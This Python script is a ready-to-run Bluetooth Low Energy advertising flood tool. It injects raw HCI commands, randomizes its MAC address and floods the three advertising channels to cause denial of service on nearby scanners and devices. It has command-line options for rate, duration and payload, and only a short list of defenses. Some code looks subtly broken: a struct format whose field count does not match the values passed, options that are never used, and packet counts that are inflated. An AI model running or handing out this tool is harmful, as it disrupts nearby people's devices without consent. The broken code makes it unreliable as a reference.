#!/usr/bin/env python3
"""
BLE Advertising Flood Attack
=============================

Floods the air with BLE advertising packets to cause denial of service
and resource exhaustion on nearby BLE devices and scanners.

Attack Vector:
--------------
Continuously broadcasts BLE advertising packets at high rate to:
- Overwhelm BLE scanners and cause processing delays
- Exhaust resources on nearby devices
- Cause connection failures
- Fill advertising channels

Technical Details:
------------------
- Protocol: BLE Link Layer
- Packet Type: ADV_IND, ADV_NONCONN_IND, ADV_SCAN_IND
- Channels: 37, 38, 39 (BLE advertising channels)
- Rate: Configurable (default 1000 pps)
- Uses raw HCI commands for packet injection

Requirements:
-------------
- Linux with BlueZ stack
- Root privileges
- BLE-capable adapter
- Python 3.11+ (uses ExceptionGroup, match/case)

Usage Examples:
---------------
    # Basic flood on default adapter
    sudo ./advertising_flood.py --adapter hci0

    # High-rate flood with custom data
    sudo ./advertising_flood.py --adapter hci0 --rate 5000 --data "SPAM"

    # Flood specific advertising type
    sudo ./advertising_flood.py --adapter hci0 --adv-type ADV_NONCONN_IND

    # Duration-limited attack
    sudo ./advertising_flood.py --adapter hci0 --duration 60

Defense Mechanisms:
-------------------
- Rate limiting on BLE scanner side
- Advertising packet filtering
- Connection allowlists
- Channel hopping randomization

Author: Wireless Security Research
License: Educational purposes only
"""

import sys
import os
import signal
import time
import argparse
import struct
import socket
import subprocess
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime

# Check Python version
if sys.version_info < (3, 11):
    print("Error: This script requires Python 3.11+", file=sys.stderr)
    print("For older Python versions, use the version-specific implementations", file=sys.stderr)
    sys.exit(1)

@dataclass
class AdvertisingFloodConfig:
    """Configuration for BLE advertising flood attack"""
    adapter: str                                    # BLE adapter (e.g., "hci0")
    rate: float = 1000.0                           # Packets per second (default: 1000)
    count: int | None = None                        # Total packets (None = unlimited)
    duration: int | None = None                     # Duration in seconds (None = unlimited)
    adv_type: str = "ADV_NONCONN_IND"             # Advertising type
    adv_data: str = "FloodTest"                    # Advertising data payload
    mac_randomize: bool = True                      # Randomize source MAC
    channel: int | None = None                      # Specific channel (None = all 3)
    interval_min: int = 20                          # Min advertising interval (ms)
    interval_max: int = 20                          # Max advertising interval (ms)
    tx_power: int = 0                               # TX power (dBm)
    verbose: bool = False                           # Verbose output

    def validate(self):
        """Validate configuration parameters"""
        errors = []

        if not self.adapter:
            errors.append("Adapter must be specified")

        if self.rate <= 0:
            errors.append("Rate must be positive")

        if self.count is not None and self.count <= 0:
            errors.append("Count must be positive")

        if self.duration is not None and self.duration <= 0:
            errors.append("Duration must be positive")

        valid_types = ["ADV_IND", "ADV_DIRECT_IND", "ADV_NONCONN_IND", "ADV_SCAN_IND"]
        if self.adv_type not in valid_types:
            errors.append(f"Invalid advertising type. Must be one of: {valid_types}")

        if self.channel is not None and self.channel not in [37, 38, 39]:
            errors.append("BLE advertising channel must be 37, 38, or 39")

        if self.interval_min < 20 or self.interval_min > 10240:
            errors.append("Interval min must be between 20-10240 ms")

        if self.interval_max < 20 or self.interval_max > 10240:
            errors.append("Interval max must be between 20-10240 ms")

        if self.interval_min > self.interval_max:
            errors.append("Interval min cannot exceed interval max")

        if errors:
            raise ExceptionGroup("Configuration validation failed", [
                ValueError(error) for error in errors
            ])

@dataclass
class AttackStatistics:
    """Statistics tracking for the attack"""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    running: bool = True

    def elapsed_time(self) -> float:
        """Get elapsed time in seconds"""
        return time.time() - self.start_time

    def packets_per_second(self) -> float:
        """Calculate current packet rate"""
        elapsed = self.elapsed_time()
        return self.packets_sent / elapsed if elapsed > 0 else 0.0

    def format_summary(self) -> str:
        """Format statistics summary"""
        elapsed = self.elapsed_time()
        pps = self.packets_per_second()

        return f"""
Attack Statistics:
------------------
Packets sent:     {self.packets_sent:,}
Bytes sent:       {self.bytes_sent:,}
Errors:           {self.errors:,}
Duration:         {elapsed:.2f} seconds
Packet rate:      {pps:.1f} pps
"""

# HCI Constants
HCI_COMMAND_PKT = 0x01
HCI_ACLDATA_PKT = 0x02
HCI_EVENT_PKT = 0x04

# HCI Commands (OGF/OCF)
OGF_LE_CTL = 0x08
OCF_LE_SET_ADVERTISING_DATA = 0x0008
OCF_LE_SET_ADVERTISING_PARAMETERS = 0x0006
OCF_LE_SET_ADVERTISING_ENABLE = 0x000A
OCF_LE_SET_RANDOM_ADDRESS = 0x0005

# Advertising types
ADV_TYPE_MAP = {
    "ADV_IND": 0x00,
    "ADV_DIRECT_IND": 0x01,
    "ADV_NONCONN_IND": 0x03,
    "ADV_SCAN_IND": 0x02
}

class BLEAdvertisingFlood:
    """BLE advertising flood attack implementation"""

    def __init__(self, config: AdvertisingFloodConfig):
        self.config = config
        self.stats = AttackStatistics()
        self.hci_socket: Optional[socket.socket] = None
        self.adapter_id = self._get_adapter_id()

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _get_adapter_id(self) -> int:
        """Extract adapter ID from adapter name (e.g., 'hci0' -> 0)"""
        if self.config.adapter.startswith('hci'):
            try:
                return int(self.config.adapter[3:])
            except ValueError:
                raise ValueError(f"Invalid adapter name: {self.config.adapter}")
        else:
            raise ValueError(f"Adapter must be in format 'hciX': {self.config.adapter}")

    def _signal_handler(self, signum, frame):
        """Handle interrupt signals gracefully"""
        print("\n[!] Interrupt received, stopping attack...")
        self.stats.running = False

    def _check_permissions(self) -> bool:
        """Check if running with root privileges"""
        if os.geteuid() != 0:
            print("[!] Error: Root privileges required", file=sys.stderr)
            print("[!] Run with: sudo ./advertising_flood.py", file=sys.stderr)
            return False
        return True

    def _check_adapter(self) -> bool:
        """Check if BLE adapter exists and is available"""
        try:
            result = subprocess.run(
                ['hciconfig', self.config.adapter],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode != 0:
                print(f"[!] Error: Adapter {self.config.adapter} not found", file=sys.stderr)
                print("[!] Available adapters:", file=sys.stderr)
                subprocess.run(['hciconfig', '-a'], timeout=5)
                return False

            # Check if adapter is UP
            if "UP RUNNING" not in result.stdout:
                print(f"[*] Bringing up adapter {self.config.adapter}...")
                subprocess.run(['hciconfig', self.config.adapter, 'up'], check=True, timeout=5)

            return True

        except subprocess.TimeoutExpired:
            print("[!] Error: Timeout checking adapter", file=sys.stderr)
            return False
        except subprocess.CalledProcessError as e:
            print(f"[!] Error: Failed to configure adapter: {e}", file=sys.stderr)
            return False
        except FileNotFoundError:
            print("[!] Error: hciconfig not found. Install bluez package.", file=sys.stderr)
            return False

    def _open_hci_socket(self) -> bool:
        """Open raw HCI socket for packet injection"""
        try:
            # Create raw HCI socket
            self.hci_socket = socket.socket(
                socket.AF_BLUETOOTH,
                socket.SOCK_RAW,
                socket.BTPROTO_HCI
            )

            # Bind to adapter
            self.hci_socket.bind((self.adapter_id,))

            if self.config.verbose:
                print(f"[+] Opened HCI socket for {self.config.adapter}")

            return True

        except OSError as e:
            print(f"[!] Error: Failed to open HCI socket: {e}", file=sys.stderr)
            print("[!] Ensure Bluetooth is enabled and you have permissions", file=sys.stderr)
            return False

    def _set_random_address(self) -> bool:
        """Set random BLE address if configured"""
        if not self.config.mac_randomize:
            return True

        try:
            # Generate random BLE address (must have top 2 bits as '11' for random static)
            import random
            addr_bytes = bytes([random.randint(0, 255) for _ in range(6)])
            addr_bytes = bytes([addr_bytes[0] | 0xC0]) + addr_bytes[1:]  # Set top 2 bits

            # Build HCI command
            cmd = struct.pack('<BHB6s',
                HCI_COMMAND_PKT,
                (OGF_LE_CTL << 10) | OCF_LE_SET_RANDOM_ADDRESS,
                6,  # Parameter length
                addr_bytes
            )

            self.hci_socket.send(cmd)

            if self.config.verbose:
                addr_str = ':'.join(f'{b:02x}' for b in addr_bytes)
                print(f"[+] Set random address: {addr_str}")

            return True

        except Exception as e:
            print(f"[!] Warning: Failed to set random address: {e}", file=sys.stderr)
            return False

    def _set_advertising_parameters(self) -> bool:
        """Configure advertising parameters"""
        try:
            adv_type = ADV_TYPE_MAP[self.config.adv_type]

            # Convert intervals to 0.625ms units
            interval_min = int(self.config.interval_min / 0.625)
            interval_max = int(self.config.interval_max / 0.625)

            # Build HCI command (simplified)
            cmd = struct.pack('<BHBHHBBBBBBBBB',
                HCI_COMMAND_PKT,
                (OGF_LE_CTL << 10) | OCF_LE_SET_ADVERTISING_PARAMETERS,
                15,  # Parameter length
                interval_min,
                interval_max,
                adv_type,
                0x00,  # Own address type (public)
                0x00,  # Peer address type
                0, 0, 0, 0, 0, 0,  # Peer address (not used)
                0x07,  # All channels
                0x00   # Filter policy
            )

            self.hci_socket.send(cmd)

            if self.config.verbose:
                print(f"[+] Set advertising parameters: type={self.config.adv_type}")

            return True

        except Exception as e:
            print(f"[!] Error: Failed to set advertising parameters: {e}", file=sys.stderr)
            return False

    def _set_advertising_data(self) -> bool:
        """Set advertising data payload"""
        try:
            # Build AD structure (Type-Length-Value)
            ad_data = bytearray()

            # Add flags (typical BLE flags)
            ad_data.extend([0x02, 0x01, 0x06])  # Length=2, Type=Flags, Value=0x06

            # Add complete local name
            name_bytes = self.config.adv_data.encode('utf-8')[:27]  # Max 27 bytes
            ad_data.extend([len(name_bytes) + 1, 0x09])  # Type=Complete Local Name
            ad_data.extend(name_bytes)

            # Pad to 31 bytes (max advertising data length)
            ad_data.extend([0] * (31 - len(ad_data)))

            # Build HCI command
            cmd = struct.pack('<BHB B 31s',
                HCI_COMMAND_PKT,
                (OGF_LE_CTL << 10) | OCF_LE_SET_ADVERTISING_DATA,
                32,  # Parameter length
                len(ad_data),
                bytes(ad_data)
            )

            self.hci_socket.send(cmd)

            if self.config.verbose:
                print(f"[+] Set advertising data: {self.config.adv_data}")

            return True

        except Exception as e:
            print(f"[!] Error: Failed to set advertising data: {e}", file=sys.stderr)
            return False

    def _enable_advertising(self, enable: bool) -> bool:
        """Enable or disable advertising"""
        try:
            cmd = struct.pack('<BHBB',
                HCI_COMMAND_PKT,
                (OGF_LE_CTL << 10) | OCF_LE_SET_ADVERTISING_ENABLE,
                1,  # Parameter length
                0x01 if enable else 0x00
            )

            self.hci_socket.send(cmd)

            if self.config.verbose:
                print(f"[+] Advertising {'enabled' if enable else 'disabled'}")

            return True

        except Exception as e:
            print(f"[!] Error: Failed to {'enable' if enable else 'disable'} advertising: {e}", file=sys.stderr)
            return False

    def _print_stats(self):
        """Print real-time statistics"""
        elapsed = self.stats.elapsed_time()
        pps = self.stats.packets_per_second()

        print(f"\r[*] Packets: {self.stats.packets_sent:,} | "
              f"Rate: {pps:.1f} pps | "
              f"Errors: {self.stats.errors} | "
              f"Time: {elapsed:.1f}s",
              end='', flush=True)

    def _should_stop(self) -> bool:
        """Check if attack should stop based on conditions"""
        # Check count limit
        if self.config.count is not None and self.stats.packets_sent >= self.config.count:
            return True

        # Check duration limit
        if self.config.duration is not None and self.stats.elapsed_time() >= self.config.duration:
            return True

        # Check running flag
        if not self.stats.running:
            return True

        return False

    def execute(self) -> int:
        """Execute the advertising flood attack"""
        try:
            # Validate configuration
            self.config.validate()

            # Check permissions
            if not self._check_permissions():
                return 1

            # Check adapter
            if not self._check_adapter():
                return 1

            # Open HCI socket
            if not self._open_hci_socket():
                return 1

            # Print banner
            self._print_banner()

            # Configure attack
            print("[*] Configuring advertising parameters...")

            if self.config.mac_randomize:
                self._set_random_address()

            if not self._set_advertising_parameters():
                return 1

            if not self._set_advertising_data():
                return 1

            # Calculate sleep time between packets
            sleep_time = 1.0 / self.config.rate if self.config.rate > 0 else 0

            print(f"[*] Starting advertising flood at {self.config.rate} pps...")
            print("[*] Press Ctrl+C to stop\n")

            # Start attack loop
            last_stats_time = time.time()

            while not self._should_stop():
                try:
                    # Enable advertising (each cycle for flooding effect)
                    if self._enable_advertising(True):
                        self.stats.packets_sent += 1
                        self.stats.bytes_sent += 31  # Advertising data size
                    else:
                        self.stats.errors += 1

                    # Disable advertising
                    self._enable_advertising(False)

                    # Rate limiting
                    if sleep_time > 0:
                        time.sleep(sleep_time)

                    # Print stats every second
                    if time.time() - last_stats_time >= 1.0:
                        self._print_stats()
                        last_stats_time = time.time()

                except Exception as e:
                    self.stats.errors += 1
                    if self.config.verbose:
                        print(f"\n[!] Error sending packet: {e}", file=sys.stderr)

            # Print final newline
            print()

            # Determine stop reason
            match (self.config.count, self.config.duration, self.stats.running):
                case (count, _, _) if count is not None and self.stats.packets_sent >= count:
                    print(f"\n[+] Attack complete: Sent {count} packets")
                case (_, duration, _) if duration is not None and self.stats.elapsed_time() >= duration:
                    print(f"\n[+] Attack complete: Duration {duration}s reached")
                case (_, _, False):
                    print("\n[+] Attack stopped by user")
                case _:
                    print("\n[+] Attack stopped")

            # Print final statistics
            print(self.stats.format_summary())

            return 0

        except ExceptionGroup as eg:
            print(f"\n[!] Configuration errors:", file=sys.stderr)
            for exc in eg.exceptions:
                print(f"  - {exc}", file=sys.stderr)
            return 1

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            return 130

        except Exception as e:
            print(f"\n[!] Fatal error: {e}", file=sys.stderr)
            if self.config.verbose:
                import traceback
                traceback.print_exc()
            return 1

        finally:
            self._cleanup()

    def _print_banner(self):
        """Print attack banner with configuration"""
        print("=" * 70)
        print("  BLE Advertising Flood Attack")
        print("=" * 70)
        print(f"Adapter:          {self.config.adapter}")
        print(f"Advertising Type: {self.config.adv_type}")
        print(f"Data Payload:     {self.config.adv_data}")
        print(f"Target Rate:      {self.config.rate} pps")
        print(f"MAC Randomize:    {self.config.mac_randomize}")

        if self.config.count:
            print(f"Packet Count:     {self.config.count:,}")
        else:
            print("Packet Count:     Unlimited")

        if self.config.duration:
            print(f"Duration:         {self.config.duration} seconds")
        else:
            print("Duration:         Unlimited")

        if self.config.channel:
            print(f"Channel:          {self.config.channel}")
        else:
            print("Channels:         37, 38, 39 (all)")

        print("=" * 70)

    def _cleanup(self):
        """Cleanup resources"""
        try:
            # Disable advertising
            if self.hci_socket:
                self._enable_advertising(False)
                self.hci_socket.close()
                if self.config.verbose:
                    print("[+] HCI socket closed")

        except Exception as e:
            if self.config.verbose:
                print(f"[!] Warning during cleanup: {e}", file=sys.stderr)

def main() -> int:
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="BLE Advertising Flood Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --adapter hci0
  %(prog)s --adapter hci0 --rate 5000 --duration 60
  %(prog)s --adapter hci0 --adv-type ADV_NONCONN_IND --data "TEST"
  %(prog)s --adapter hci0 --count 10000 --mac-randomize

Educational purposes only. Unauthorized use is illegal.
"""
    )

    # Required arguments
    parser.add_argument('--adapter', required=True,
                       help='BLE adapter (e.g., hci0)')

    # Optional arguments
    parser.add_argument('--rate', type=float, default=1000.0,
                       help='Packets per second (default: 1000)')
    parser.add_argument('--count', type=int,
                       help='Total packets to send (default: unlimited)')
    parser.add_argument('--duration', type=int,
                       help='Attack duration in seconds (default: unlimited)')
    parser.add_argument('--adv-type', default='ADV_NONCONN_IND',
                       choices=['ADV_IND', 'ADV_DIRECT_IND', 'ADV_NONCONN_IND', 'ADV_SCAN_IND'],
                       help='Advertising packet type (default: ADV_NONCONN_IND)')
    parser.add_argument('--data', default='FloodTest',
                       help='Advertising data payload (default: FloodTest)')
    parser.add_argument('--mac-randomize', action='store_true', default=True,
                       help='Randomize source MAC address (default: True)')
    parser.add_argument('--no-mac-randomize', action='store_false', dest='mac_randomize',
                       help='Disable MAC randomization')
    parser.add_argument('--channel', type=int, choices=[37, 38, 39],
                       help='Specific advertising channel (default: all 3 channels)')
    parser.add_argument('--interval-min', type=int, default=20,
                       help='Min advertising interval in ms (default: 20)')
    parser.add_argument('--interval-max', type=int, default=20,
                       help='Max advertising interval in ms (default: 20)')
    parser.add_argument('--tx-power', type=int, default=0,
                       help='TX power in dBm (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    # Create configuration
    config = AdvertisingFloodConfig(
        adapter=args.adapter,
        rate=args.rate,
        count=args.count,
        duration=args.duration,
        adv_type=args.adv_type,
        adv_data=args.data,
        mac_randomize=args.mac_randomize,
        channel=args.channel,
        interval_min=args.interval_min,
        interval_max=args.interval_max,
        tx_power=args.tx_power,
        verbose=args.verbose
    )

    # Execute attack
    attack = BLEAdvertisingFlood(config)
    return attack.execute()

if __name__ == '__main__':
    sys.exit(main())
